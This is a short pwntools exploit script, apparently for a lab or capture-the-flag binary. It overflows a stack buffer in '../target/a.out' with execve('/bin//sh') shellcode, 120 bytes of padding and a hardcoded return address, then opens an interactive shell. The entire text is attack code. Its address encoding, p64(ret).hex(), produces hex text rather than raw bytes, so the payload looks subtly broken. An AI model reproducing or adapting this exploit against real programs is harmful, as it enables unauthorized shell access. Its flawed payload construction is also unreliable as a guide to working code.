from pwn import *

io = process('../target/a.out')

ret = 0x7ffffffee738
shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

payload = shellcode + "A" * (120 - len(shellcode)) + p64(ret).hex()
print(shellcode)
io.send(payload)
io.interactive()
